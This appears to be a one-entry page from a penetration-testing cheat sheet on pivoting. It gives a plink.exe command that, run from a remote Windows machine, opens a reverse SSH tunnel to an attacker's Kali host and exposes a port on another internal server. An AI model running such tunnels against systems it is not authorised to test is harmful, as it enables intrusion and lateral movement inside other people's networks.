---
title: Plink
parent: Pivot
layout: default
nav_order: 5
---

For Windows

From remote Windows PC:\
`cmd.exe /c echo y | plink.exe -ssh -l username -pw password -R KaliIP:Kaliport:OtherRemoteServerIP:Port KaliIP`

Can then connect via kaliport to access the remote server's port.